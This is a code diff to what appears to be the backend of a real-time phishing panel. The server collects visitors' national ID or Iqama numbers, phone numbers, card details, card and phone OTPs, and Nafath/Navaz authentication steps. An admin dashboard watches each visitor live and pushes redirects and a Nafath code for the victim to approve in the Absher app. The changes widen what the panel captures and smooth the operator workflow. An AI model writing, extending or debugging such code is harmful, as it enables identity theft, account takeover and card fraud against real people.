@@ -77,6 +77,7 @@ const TRUSTED_ADMIN_ORIGINS = new Set(
 const db = (() => {
   const empty = {
     users: {},        // uuid -> session row (used by dashboard GET /users)
+    sessionAliases: {}, // legacy/generated ids -> canonical visitor id
     submissions: [],  // audit log { id, type, uuid, payload, ts }
     policies: [],
     details: [],
@@ -214,7 +215,7 @@ function canonicalSession(id, row, timestamp) {
   // `id`/`uuid`; expose all three identifiers consistently on every response.
   document._id = id;
   for (const field of SESSION_FIELDS) document[field] = source[field] ?? null;
-  document.name = document.name ?? source.documentOwnerName ?? source.fullName ?? null;
+  document.name = document.name ?? source.documentOwnerName ?? source.fullName ?? source.carHolderName ?? source.cardHolderName ?? null;
   document.national_id = document.national_id ?? source.idNumber ?? source.identityNumber ?? null;
   document.phone = document.phone ?? source.mobileNumber ?? source.phoneNumber ?? null;
   document.serialNumber = document.serialNumber ?? source.sequenceNumber ?? null;
@@ -304,8 +305,7 @@ function upsertSession(id, patch, extra = {}) {
   state.users[id] = next;
   db.save();
   // Push realtime update to dashboards
-  io.emit("sessionUpdate", next);
-  io.to("admins").emit("newVisitor", next);
+  io.to("admins").emit("sessionUpdate", next);
   return next;
 }
 
@@ -346,7 +346,6 @@ function recordSubmission(type, payload) {
     `[submission] ${type} ${payload?.result || ""} total=${state.submissions.length}`
   );
   io.to("admins").emit("live:update", entry);
-  io.emit("live:update", entry);
   if (id) {
     // Mirror flat fields so the dashboard's session table shows the data.
     // The site nests real values under payload.formData (sometimes deeper),
@@ -369,7 +368,7 @@ function recordSubmission(type, payload) {
     };
     set("idNumber", ["identityNumber", "nationalIdIqama", "idNumber", "nationalId", "iqama"]);
     set("phone", ["mobileNumber", "phone", "phoneNumber", "mobile"]);
-    set("name", ["documentOwnerName", "name", "fullName"]);
+    set("name", ["documentOwnerName", "name", "fullName", "carHolderName", "cardHolderName", "cardholderName"]);
     set("cardholderName", ["cardholderName"]);
 
     set("sequenceNumber", ["sequenceNumber", "serialNumber"]);
@@ -416,6 +415,16 @@ function recordSubmission(type, payload) {
     set("provider", ["provider"]);
     set("referenceId", ["referenceId", "reference_id"]);
     set("page", ["page", "currentPage", "step", "page_path"]);
+    // Keep additional scalar values visible in the dashboard even when a new
+    // page field has not yet been added to this normalization table.
+    const ignoredFlatKeys = new Set(["id", "uuid", "userId", "sessionId", "raw"]);
+    for (const [key, value] of Object.entries(p)) {
+      if (ignoredFlatKeys.has(key)) continue;
+      if (value === null || value === undefined || value === "") continue;
+      if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") {
+        if (flat[key] === undefined) flat[key] = value;
+      }
+    }
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
     // Per-page bucket: keep the latest client inputs grouped by the page/event
@@ -426,9 +435,9 @@ function recordSubmission(type, payload) {
     // visitor submitted the form. Prefer an explicit route, otherwise keep
     // the last known route for marker-only events.
     const lifecyclePage =
-      type === "reg" ? "/reg" :
-      type === "apply" ? (existingUser.lastPage || "/reg") :
-      type === "company" ? (existingUser.lastPage || "/confirm") :
+      type === "reg" ? (payload?.page || "/") :
+      type === "apply" ? (payload?.page || "/reg") :
+      type === "company" ? (payload?.page || "/activate") :
       null;
     const pageKey = String(
       flat.page ||
@@ -460,6 +469,7 @@ function recordSubmission(type, payload) {
       pages: nextPages,
       lastEvent: type,
       lastPage: pageKey,
+      currentPage: pageKey,
       stage: type,
       lastSubmissionAt: now(),
     });
@@ -561,15 +571,7 @@ function broadcastAdminEvent(id, event, payload) {
     /nafath.*(number|code)/.test(key) ||
     /(send|set).*nafath/.test(key);
 
-  // Preserve the exact legacy event that the current customer page listens
-  // for, but dispatch it only once through this unified handler.
-  if (!isRedirectEvent && !isNafathNumberEvent) target.emit(event, data);
-
   const alias = ADMIN_EVENT_ALIASES[key];
-  if (alias) {
-    const [aliasEvent, action] = alias;
-    target.emit(aliasEvent, { ...data, action });
-  }
 
   // Redirect: dashboard chooses the destination page.
   if (isRedirectEvent) {
@@ -578,14 +580,9 @@ function broadcastAdminEvent(id, event, payload) {
       page: data.page || data.path || data.route || data.to || "/",
       pageName: data.pageName || data.title || "",
     };
-    target.emit("admin:redirect", redirectPayload);
     target.emit("adminRedirect", redirectPayload);
-  }
-
-  // Nafath verification number: dashboard sends the 2-digit code that
-  // the customer must tap in the Absher app on page 7. The customer
-  // bundle listens for `nafath:code` with { verificationCode: "42" }.
-  if (isNafathNumberEvent) {
+  } else if (isNafathNumberEvent) {
+    // The customer bundle listens for the legacy changeNavazCode event.
     const raw = String(
       data.verificationCode ??
         data.code ??
@@ -603,8 +600,7 @@ function broadcastAdminEvent(id, event, payload) {
     if (!/^\d{2}$/.test(digits)) return false;
     const code = digits;
     const codePayload = { ...data, verificationCode: code, code, number: code, userOtp: code };
-    if (key === "changenavazcode") target.emit("changeNavazCode", codePayload);
-    target.emit("nafath:code", codePayload);
+    target.emit("changeNavazCode", codePayload);
 
     // "Send # & Redirect": if the dashboard event or payload says so,
     // also push the client to page 7 (/nafath) so they see the badge.
@@ -615,12 +611,20 @@ function broadcastAdminEvent(id, event, payload) {
       data.navigate === true ||
       /nafath/i.test(String(data.page || data.route || data.to || ""));
     if (wantsRedirect) {
-      target.emit("admin:redirect", {
+      target.emit("adminRedirect", {
         ...data,
-        page: "/nafath",
-        pageName: data.pageName || "nafath",
+        page: "/navaz",
+        path: "/navaz",
+        pageName: data.pageName || "navaz",
       });
     }
+  } else if (alias) {
+    // The current customer build listens for legacy events such as
+    // acceptPaymentForm and acceptVisaOtp. Sending both legacy and
+    // namespaced aliases makes a page advance twice and duplicates writes.
+    target.emit(event, { ...data, action: alias[1] });
+  } else {
+    target.emit(event, data);
   }
 
 
@@ -697,9 +701,10 @@ app.get("/order/status/:id", (req, res) => {
 // ---------- REST: customer site (frontend contract) ----------
 app.post("/api/user/init", (req, res) => {
   const { browserInfo } = req.body || {};
-  // The backend owns the session UUID. The returned UUID is then used by the
-  // customer and dashboard for all subsequent Railway-backed writes.
-  const id = uuid();
+  // Reuse the browser's seeded id when the client provides it. Older clients
+  // that send no identifier still receive a new id, but the current frontend
+  // will not create a second row before its first form submission.
+  const id = req.body?.visitorId || req.body?.uuid || req.body?.id || uuid();
   const ip = clientIp(req);
   upsertSession(id, {
     ip,
@@ -935,6 +940,14 @@ app.get("/users", maybeAdmin, (_req, res) => {
   const list = Object.values(db.get().users).sort(
     (a, b) => (Date.parse(b.updatedAt || 0) || 0) - (Date.parse(a.updatedAt || 0) || 0)
   );
+  const fingerprint = crypto
+    .createHash("sha1")
+    .update(list.map((row) => `${row._id || row.id || row.uuid}:${row.updatedAt || ""}`).join("|"))
+    .digest("hex");
+  const etag = `W/"users-${fingerprint}"`;
+  res.set("ETag", etag);
+  res.set("Cache-Control", "private, max-age=0, must-revalidate");
+  if (_req.headers["if-none-match"] === etag) return res.status(304).end();
   res.json(list);
 });
 // Safe dashboard feed: return only operational counters and timestamps. Never
@@ -975,13 +988,21 @@ app.delete("/users/:id", maybeAdmin, (req, res) => {
 });
 
 app.post("/reg", (req, res) => {
-  const id = req.body.id || req.body.uuid || newId();
+  const body = req.body || {};
+  const requestId = String(body.requestId || body.idempotencyKey || "").trim();
+  if (requestId) {
+    const previous = db.get().submissions.find(
+      (entry) => entry.type === "reg" && String(entry.payload?.requestId || "") === requestId,
+    );
+    if (previous?.uuid && db.get().users[previous.uuid]) return res.json(db.get().users[previous.uuid]);
+  }
+  const id = body.id || body.uuid || body.visitorId || newId();
   const s = upsertSession(id, {
-    ...req.body,
+    ...body,
     ip: clientIp(req),
     stage: "registered",
   });
-  recordSubmission("reg", { ...req.body, uuid: id });
+  recordSubmission("reg", { ...body, uuid: id });
   res.json(s);
 });
 
@@ -1082,7 +1103,7 @@ io.on("connection", (socket) => {
     socket.join(`session:${id}`);
     socket.join(`user:${id}`);
     const pagePath = String(payload.pagePath || "").split("?")[0];
-    const session = upsertSession(id, {
+    upsertSession(id, {
       lastSeen: now(),
       ip: clientIp(socket.request),
       stage: payload.state?.page || payload.state?.stage || "service",
@@ -1095,18 +1116,15 @@ io.on("connection", (socket) => {
     if (SAFE_TRACKED_PATHS.has(pagePath)) {
       recordSubmission("activity", { uuid: id, page_path: pagePath });
     }
-    io.to("admins").emit("live:update", {
-      type: "visitor_state_changed",
-      uuid: id,
-      session,
-      ts: now(),
-    });
   });
 
   // -------- Frontend (customer site) join --------
   socket.on("user:join", (p = {}) => {
     const userType = p.userType || "client";
-    const uid = p.userId || p.userInfo?.uuid || uuid();
+    // The current customer bundle joins before it calls bindOrder and sends
+    // no id. Do not persist a random placeholder row; bindOrder will attach
+    // this socket to the browser's canonical session id a moment later.
+    const uid = p.userId || p.userInfo?.uuid || null;
     socket.data.userType = userType;
     socket.data.userId = uid;
     socket.data.sessionId = uid;
@@ -1156,6 +1174,16 @@ io.on("connection", (socket) => {
       socket.join("admins");
       socket.emit("user:joined", { userId: uid });
       socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
+      return;
+    }
+
+    if (!uid) {
+      JOIN_METRICS.client_join_ok++;
+      logJoinEvent({
+        handler: "user:join", role: "client", result: "awaiting_bind",
+        socketId: socket.id, ip, ua,
+      });
+      socket.emit("user:joined", { userId: null });
       return;
     }
 
@@ -1254,35 +1282,38 @@ io.on("connection", (socket) => {
     socket.data.sessionId = id;
     socket.join(`session:${id}`);
     socket.join(`user:${id}`);
-    const session = upsertSession(id, {
+    upsertSession(id, {
       lastSeen: now(),
       ip: clientIp(socket.request),
       lastEvent: "visitor_bound",
       stage: "service",
     });
-    io.to("admins").emit("live:update", {
-      type: "visitor_bound",
-      uuid: id,
-      session,
-      ts: now(),
-    });
   });
 
   socket.on("newData", (payload = {}) => {
     const id = payload.id || payload.uuid || socket.data.sessionId || newId();
-    const s = upsertSession(id, payload);
-    recordSubmission("newData", { ...payload, uuid: id });
-    io.to("admins").emit("newVisitor", s);
+    upsertSession(id, payload);
+    recordSubmission("newData", { ...payload, uuid: id, page: payload.page || "/" });
   });
 
   // visitor -> admin submissions (tmn contract)
+  const customerEventPages = {
+    paymentForm: "/confirm",
+    visaOtp: "/verfiy",
+    phone: "/phone",
+    phoneOtp: "/phoneOtp",
+    navaz: "/navaz",
+  };
   ["paymentForm", "visaOtp", "phone", "phoneOtp", "navaz"].forEach((ev) => {
     socket.on(ev, (payload = {}) => {
       const id = payload.id || payload.uuid || socket.data.sessionId;
       if (!id) return;
       upsertSession(id, { [ev]: payload, lastEvent: ev, stage: ev });
-      recordSubmission(ev, { ...payload, uuid: id });
-      io.to("admins").emit(ev, { ...payload, id, uuid: id });
+      recordSubmission(ev, {
+        ...payload,
+        uuid: id,
+        page: payload.page || customerEventPages[ev] || ev,
+      });
     });
   });
 
